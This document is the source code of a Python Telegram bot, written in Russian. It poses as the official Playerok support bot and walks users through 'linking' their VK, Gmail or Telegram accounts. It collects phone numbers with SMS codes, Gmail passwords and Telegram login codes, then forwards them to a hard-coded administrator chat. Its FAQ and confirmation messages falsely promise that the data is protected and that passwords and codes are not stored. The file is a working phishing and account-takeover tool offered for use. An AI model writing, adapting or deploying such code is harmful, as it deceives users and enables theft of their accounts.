import telebot
import os
import re
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    logger.error("TOKEN не найден в переменных окружения!")
    exit(1)

bot = telebot.TeleBot(TOKEN)

# ID администратора для пересылки сообщений
ADMIN_ID = 6743689067

# Хранилище состояний
state = {}

# --- КЛАВИАТУРЫ ---
def main_keyboard():
    """Главная клавиатура с кнопками выбора"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_vk = KeyboardButton("🔵 ВКонтакте")
    btn_gmail = KeyboardButton("📧 Gmail")
    btn_tg = KeyboardButton("✈️ Telegram")
    btn_faq = KeyboardButton("❓ FAQ")
    markup.add(btn_vk, btn_gmail, btn_tg)
    markup.add(btn_faq)
    return markup

def back_keyboard():
    """Клавиатура с кнопкой назад"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_back = KeyboardButton("◀️ Назад")
    markup.add(btn_back)
    return markup

def confirm_keyboard():
    """Клавиатура подтверждения"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_confirm = KeyboardButton("✅ Подтверждаю")
    btn_cancel = KeyboardButton("❌ Отмена")
    markup.add(btn_confirm, btn_cancel)
    return markup

def admin_reply_keyboard(user_id):
    """Клавиатура для администратора с кнопкой ответа"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_reply = KeyboardButton(f"✉️ Ответить пользователю {user_id}")
    markup.add(btn_reply)
    return markup

def escape_markdown(text):
    """Экранирование специальных символов для Markdown"""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in escape_chars else char for char in str(text))

# --- ОСНОВНЫЕ ФУНКЦИИ ---
def send_to_admin(chat_id, text, reply_markup=None):
    """Безопасная отправка сообщения администратору"""
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown", reply_markup=reply_markup)
        return True
    except Exception as e:
        logger.error(f"Ошибка при отправке админу: {e}")
        return False

@bot.message_handler(commands=['start'])
def start(message):
    """Обработчик команды /start"""
    try:
        # Отправляем приветствие пользователю
        bot.send_message(
            message.chat.id,
            "👋 Здравствуйте!\n\n"
            "🛡 Это официальный бот поддержки Playerok.\n\n"
            "📌 Для обработки вашего запроса необходимо определить способ привязки аккаунта.\n\n"
            "🔽 Выберите, к какому сервису привязан ваш аккаунт Playerok:\n\n"
            "🔵 ВКонтакте\n"
            "📧 Gmail\n"
            "✈️ Telegram\n\n"
            "⚡️ После выбора следуйте инструкциям бота.\n\n"
            "❓ Если у вас есть вопросы, нажмите кнопку FAQ.",
            reply_markup=main_keyboard()
        )
        
        # Уведомляем администратора о новом пользователе
        user_info = (
            f"👤 **Новый пользователь**\n\n"
            f"🆔 ID: `{message.chat.id}`\n"
            f"📛 Имя: {escape_markdown(message.from_user.first_name)}\n"
            f"🔗 Username: @{escape_markdown(message.from_user.username) if message.from_user.username else 'отсутствует'}"
        )
        send_to_admin(message.chat.id, user_info)
        
    except Exception as e:
        logger.error(f"Ошибка в start: {e}")
        bot.send_message(message.chat.id, "❌ Произошла ошибка. Пожалуйста, попробуйте позже.")

# --- FAQ ---
def send_faq(message):
    """Отправка FAQ"""
    faq_text = (
        "❓ **Часто задаваемые вопросы**\n\n"
        "**1. Зачем нужна привязка аккаунта?**\n"
        "Привязка аккаунта позволяет нам идентифицировать вашу учётную запись "
        "и быстрее обработать ваш запрос.\n\n"
        
        "**2. Безопасны ли мои данные?**\n"
        "🔒 **Да, все данные защищены!**\n"
        "• Ваши данные передаются по защищённому соединению\n"
        "• Мы не храним пароли и коды подтверждения\n"
        "• Информация используется только для верификации аккаунта\n"
        "• Все данные обрабатываются конфиденциально\n"
        "• Никакие личные данные не передаются третьим лицам\n\n"
        
        "**3. Что делать, если я ошибся при вводе?**\n"
        "Вы можете нажать кнопку «◀️ Назад» и начать заново, "
        "или нажать «❌ Отмена» для полной отмены операции.\n\n"
        
        "**4. Сколько времени занимает обработка заявки?**\n"
        "Обычно обработка заявки занимает от 5 до 30 минут.\n\n"
        
        "**5. Что делать, если я не получил код подтверждения?**\n"
        "Проверьте интернет-соединение и попробуйте ещё раз.\n\n"
        
        "**6. Могу ли я привязать несколько аккаунтов?**\n"
        "Да, вы можете привязать несколько аккаунтов.\n\n"
        
        "**7. Как отвязать аккаунт?**\n"
        "Для отвязки аккаунта обратитесь в службу поддержки Playerok.\n\n"
        
        "---\n"
        "🔒 **Политика конфиденциальности**\n"
        "Ваши данные защищены в соответствии с законодательством."
    )
    
    try:
        bot.send_message(
            message.chat.id,
            faq_text,
            parse_mode="Markdown",
            reply_markup=main_keyboard()
        )
    except Exception as e:
        logger.error(f"Ошибка в FAQ: {e}")
        bot.send_message(message.chat.id, faq_text, reply_markup=main_keyboard())

# --- ОБРАБОТКА КНОПОК ---
@bot.message_handler(func=lambda message: message.text in ["🔵 ВКонтакте", "📧 Gmail", "✈️ Telegram", "◀️ Назад", "✅ Подтверждаю", "❌ Отмена", "❓ FAQ"])
def button_handler(message):
    """Обработчик всех кнопок"""
    try:
        # Обработка главных кнопок выбора сервиса
        if message.text == "🔵 ВКонтакте":
            state[message.chat.id] = {"step": "vk_phone", "data": {}}
            bot.send_message(message.chat.id, "🔵 Вы выбрали ВКонтакте.\n\n📱 Введите номер телефона VK:", reply_markup=back_keyboard())
        
        elif message.text == "📧 Gmail":
            state[message.chat.id] = {"step": "gmail_email", "data": {}}
            bot.send_message(message.chat.id, "📧 Вы выбрали Gmail.\n\n✉️ Введите email:", reply_markup=back_keyboard())
        
        elif message.text == "✈️ Telegram":
            state[message.chat.id] = {"step": "tg_username", "data": {}}
            bot.send_message(message.chat.id, "✈️ Вы выбрали Telegram.\n\n👤 Введите ваш @username:", reply_markup=back_keyboard())
        
        elif message.text == "❓ FAQ":
            send_faq(message)
        
        elif message.text == "◀️ Назад":
            # Очищаем состояние и возвращаем главное меню
            if message.chat.id in state:
                del state[message.chat.id]
            bot.send_message(message.chat.id, "🔙 Возвращаемся в главное меню.", reply_markup=main_keyboard())
        
        elif message.text == "✅ Подтверждаю":
            # Обработка подтверждения
            user_state = state.get(message.chat.id)
            if user_state and user_state.get("step") == "confirm" and not user_state.get("processed", False):
                # Помечаем как обработанное, чтобы избежать повторной отправки
                user_state["processed"] = True
                
                bot.send_chat_action(message.chat.id, 'typing')
                
                # Отправляем финальное сообщение пользователю
                bot.send_message(
                    message.chat.id,
                    "✅ Ваша заявка успешно отправлена!\n\n"
                    "🔒 **Ваши данные защищены и будут обработаны конфиденциально.**\n\n"
                    "🕐 Ожидайте, ваша заявка будет рассмотрена.\n"
                    "📞 Специалист свяжется с вами в ближайшее время.\n\n"
                    "🙏 Спасибо за обращение в поддержку Playerok!",
                    parse_mode="Markdown",
                    reply_markup=main_keyboard()
                )
                
                # Отправляем данные администратору
                try:
                    user_data = user_state.get("data", {})
                    service_type = "Неизвестно"
                    formatted_data = ""
                    
                    if "phone" in user_data:
                        service_type = "🔵 ВКонтакте"
                        formatted_data = (
                            f"📱 Номер телефона: `{escape_markdown(user_data.get('phone', ''))}`\n"
                            f"🔐 Код: `{escape_markdown(user_data.get('code', ''))}`"
                        )
                    elif "email" in user_data:
                        service_type = "📧 Gmail"
                        formatted_data = (
                            f"✉️ Email: `{escape_markdown(user_data.get('email', ''))}`\n"
                            f"🔑 Пароль: `{escape_markdown(user_data.get('password', ''))}`"
                        )
                    elif "username" in user_data:
                        service_type = "✈️ Telegram"
                        formatted_data = (
                            f"👤 Username: `{escape_markdown(user_data.get('username', ''))}`\n"
                            f"🔐 Код: `{escape_markdown(user_data.get('code', ''))}`"
                        )
                    
                    admin_message = (
                        f"📨 **НОВАЯ ЗАЯВКА!**\n\n"
                        f"👤 **Пользователь:**\n"
                        f"🆔 ID: `{message.chat.id}`\n"
                        f"📛 Имя: {escape_markdown(message.from_user.first_name)}\n"
                        f"🔗 Username: @{escape_markdown(message.from_user.username) if message.from_user.username else 'отсутствует'}\n\n"
                        f"🔧 **Сервис:** {service_type}\n\n"
                        f"📋 **Данные:**\n{formatted_data}\n\n"
                        f"✅ Статус: Ожидает обработки"
                    )
                    
                    # Отправляем данные админу с кнопкой для ответа
                    send_to_admin(message.chat.id, admin_message, admin_reply_keyboard(message.chat.id))
                    
                except Exception as e:
                    logger.error(f"Ошибка при отправке админу: {e}")
                    send_to_admin(message.chat.id, f"❌ Ошибка при получении данных от пользователя {message.chat.id}: {e}")
                
                # Очищаем состояние
                del state[message.chat.id]
        
        elif message.text == "❌ Отмена":
            # Отмена операции
            if message.chat.id in state:
                del state[message.chat.id]
            bot.send_message(
                message.chat.id, 
                "❌ Операция отменена.\n\nЕсли передумаете, просто выберите способ привязки снова:",
                reply_markup=main_keyboard()
            )
            
    except Exception as e:
        logger.error(f"Ошибка в button_handler: {e}")
        bot.send_message(message.chat.id, "❌ Произошла ошибка. Пожалуйста, попробуйте позже.")
        if message.chat.id in state:
            del state[message.chat.id]

# --- ОБРАБОТКА ОТВЕТОВ АДМИНИСТРАТОРА ---
@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID and message.text.startswith("✉️ Ответить пользователю"))
def admin_reply_handler(message):
    """Обработчик кнопки ответа пользователю для администратора"""
    try:
        # Извлекаем ID пользователя из текста кнопки
        user_id = int(message.text.split()[-1])
        # Сохраняем состояние для ответа
        state[ADMIN_ID] = {"step": "admin_reply", "user_id": user_id}
        bot.send_message(
            ADMIN_ID, 
            f"✏️ Введите сообщение для пользователя `{user_id}`:",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Ошибка в admin_reply_handler: {e}")
        bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")

@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID and state.get(ADMIN_ID, {}).get("step") == "admin_reply")
def send_admin_reply(message):
    """Отправка ответа пользователю от администратора"""
    try:
        user_id = state[ADMIN_ID]["user_id"]
        reply_text = message.text
        
        # Отправляем ответ пользователю
        bot.send_message(
            user_id,
            f"📨 **Ответ от службы поддержки Playerok:**\n\n{reply_text}\n\n"
            f"💬 Если у вас остались вопросы, вы можете продолжить диалог.",
            parse_mode="Markdown",
            reply_markup=main_keyboard()
        )
        
        # Подтверждение админу
        bot.send_message(
            ADMIN_ID,
            f"✅ Ответ успешно отправлен пользователю `{user_id}`",
            parse_mode="Markdown",
            reply_markup=main_keyboard()
        )
        
        # Очищаем состояние
        del state[ADMIN_ID]
        
    except Exception as e:
        logger.error(f"Ошибка при отправке ответа: {e}")
        bot.send_message(ADMIN_ID, f"❌ Не удалось отправить сообщение пользователю: {e}")

# --- ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ ---
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    """Обработчик текстовых сообщений"""
    # Игнорируем сообщения от администратора в режиме ответа
    if message.chat.id == ADMIN_ID and state.get(ADMIN_ID, {}).get("step") == "admin_reply":
        return
    
    user_state = state.get(message.chat.id)
    if not user_state:
        return
    
    step = user_state.get("step")
    
    try:
        # ВКонтакте - ввод номера телефона
        if step == "vk_phone":
            phone = message.text.strip()
            if re.match(r"^[\d\s\+\(\)\-]{10,20}$", phone):
                user_state["data"]["phone"] = phone
                user_state["step"] = "vk_code"
                bot.send_message(message.chat.id, "🔐 Введите код подтверждения из SMS:", reply_markup=back_keyboard())
            else:
                bot.send_message(message.chat.id, "❌ Неверный формат номера телефона. Попробуйте еще раз:")
        
        # ВКонтакте - ввод кода
        elif step == "vk_code":
            user_state["data"]["code"] = message.text.strip()
            show_confirmation(message, user_state["data"], "vk")
        
        # Gmail - ввод email
        elif step == "gmail_email":
            email = message.text.strip()
            if re.match(r"^[a-zA-Z0-9._%+-]+@gmail\.com$", email):
                user_state["data"]["email"] = email
                user_state["step"] = "gmail_pass"
                bot.send_message(message.chat.id, "🔑 Введите пароль:", reply_markup=back_keyboard())
            else:
                bot.send_message(message.chat.id, "❌ Неверный формат email. Используйте адрес @gmail.com")
        
        # Gmail - ввод пароля
        elif step == "gmail_pass":
            user_state["data"]["password"] = message.text.strip()
            show_confirmation(message, user_state["data"], "gmail")
        
        # Telegram - ввод username
        elif step == "tg_username":
            username = message.text.strip()
            if username.startswith("@"):
                user_state["data"]["username"] = username
                user_state["step"] = "tg_code"
                bot.send_message(message.chat.id, "🔐 Введите код подтверждения:", reply_markup=back_keyboard())
            else:
                bot.send_message(message.chat.id, "❌ Username должен начинаться с @. Попробуйте еще раз:")
        
        # Telegram - ввод кода
        elif step == "tg_code":
            user_state["data"]["code"] = message.text.strip()
            show_confirmation(message, user_state["data"], "tg")
            
    except Exception as e:
        logger.error(f"Ошибка в handle_text: {e}")
        bot.send_message(message.chat.id, "❌ Произошла ошибка. Пожалуйста, начните заново с /start")
        if message.chat.id in state:
            del state[message.chat.id]

def show_confirmation(message, data, service):
    """Показывает подтверждение введенных данных"""
    try:
        if service == "vk":
            confirm_text = (
                "📋 Проверьте введенные данные:\n\n"
                f"🔵 Сервис: ВКонтакте\n"
                f"📱 Номер телефона: `{escape_markdown(data.get('phone', ''))}`\n"
                f"🔐 Код подтверждения: `{escape_markdown(data.get('code', ''))}`\n\n"
                "🔒 **Все данные защищены и будут обработаны конфиденциально.**\n\n"
                "✅ Всё верно?"
            )
        elif service == "gmail":
            password = data.get('password', '')
            hidden_password = "*" * len(password)
            confirm_text = (
                "📋 Проверьте введенные данные:\n\n"
                f"📧 Сервис: Gmail\n"
                f"✉️ Email: `{escape_markdown(data.get('email', ''))}`\n"
                f"🔑 Пароль: `{hidden_password}`\n\n"
                "🔒 **Все данные защищены и будут обработаны конфиденциально.**\n\n"
                "✅ Всё верно?"
            )
        elif service == "tg":
            confirm_text = (
                "📋 Проверьте введенные данные:\n\n"
                f"✈️ Сервис: Telegram\n"
                f"👤 Username: `{escape_markdown(data.get('username', ''))}`\n"
                f"🔐 Код подтверждения: `{escape_markdown(data.get('code', ''))}`\n\n"
                "🔒 **Все данные защищены и будут обработаны конфиденциально.**\n\n"
                "✅ Всё верно?"
            )
        else:
            return
        
        # Сохраняем состояние для подтверждения
        state[message.chat.id]["step"] = "confirm"
        state[message.chat.id]["processed"] = False
        bot.send_message(message.chat.id, confirm_text, parse_mode="Markdown", reply_markup=confirm_keyboard())
        
    except Exception as e:
        logger.error(f"Ошибка в show_confirmation: {e}")
        bot.send_message(message.chat.id, "❌ Произошла ошибка. Пожалуйста, начните заново.")
        if message.chat.id in state:
            del state[message.chat.id]

if __name__ == "__main__":
    try:
        logger.info("🤖 Бот запущен и готов к работе!")
        logger.info(f"📨 Администратор ID: {ADMIN_ID}")
        
        # Проверяем, что админ доступен
        try:
            bot.send_message(ADMIN_ID, "🤖 Бот успешно запущен и готов к работе!")
            logger.info("✅ Уведомление администратору отправлено")
        except Exception as e:
            logger.warning(f"⚠️ Не удалось отправить сообщение администратору: {e}")
        
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
        
    except Exception as e:
        logger.error(f"❌ Критическая ошибка: {e}")
